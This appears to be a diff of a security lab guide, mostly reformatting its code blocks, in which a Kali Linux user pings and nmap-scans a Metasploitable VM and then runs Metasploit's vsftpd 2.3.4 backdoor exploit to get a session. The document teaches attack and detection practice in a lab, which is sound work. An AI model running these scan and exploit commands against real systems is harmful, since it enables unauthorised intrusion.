@@ -71,16 +71,16 @@ GPG (GNU Privacy Guard) keys are used to digitally sign packages in a Linux dist
 Objective: Generate network traffic and identify open ports and services on the Metasploitable VM.
 
 1. Ping Metasploitable from Kali: Open a terminal in Kali Linux and run:
-```
-ping <Metasploitable_IP>
-```
+  ```
+  ping <Metasploitable_IP>
+  ```
 
 This sends ICMP echo requests to the Metasploitable VM, generating network traffic that can be monitored by NDR solutions.
 
 2. Open a terminal in Kali Linux. Run Nmap to scan the Metasploitable VM:
-```
-nmap -sS -sV -p- <Metasploitable_IP>
-```
+   ```
+   nmap -sS -sV -p- <Metasploitable_IP>
+   ```
 3. Analyze the output: Look for open ports, the state of each port (open/closed/filtered), and the service/version information.
 
 Running nmap -sS -sV -p- <Metasploitable_IP> provides crucial information about the network services available on the target. This reconnaissance step is vital for ethical hackers and attackers alike, and understanding the implications of the scan output is essential for effective security assessments and incident response strategies.
@@ -92,23 +92,22 @@ Objective: Exploit vulnerabilities in Metasploitable to simulate an attack,obser
 1.  Open a terminal in Kali Linux.
 
 2.  Launch Metasploit:
-``` 
-msfconsole
-```
+    ``` 
+    msfconsole
+    ```
 
 2. Search for available exploits for Metasploitable services (e.g., vsftpd):
-```
-search vsftpd
-```
-vsFTPd (Very Secure FTP Daemon) is a popular FTP server for Unix-like systems. It is known for its simplicity and security feature
+   ```
+   search vsftpd
+   ```
+   vsFTPd (Very Secure FTP Daemon) is a popular FTP server for Unix-like systems. It is known for its simplicity and security features.
 
 3. Select and configure the exploit:
-```
-use exploit/unix/ftp/vsftpd_234_backdoor
-set RHOST <Metasploitable_IP>
-exploit
-```
-
+    ```
+    use exploit/unix/ftp/vsftpd_234_backdoor
+    set RHOST <Metasploitable_IP>
+    exploit
+    ```
 4. Verify Access: Interact with the session created after exploitation.
 
 **Activity 3: Post-Exploitation Actions**
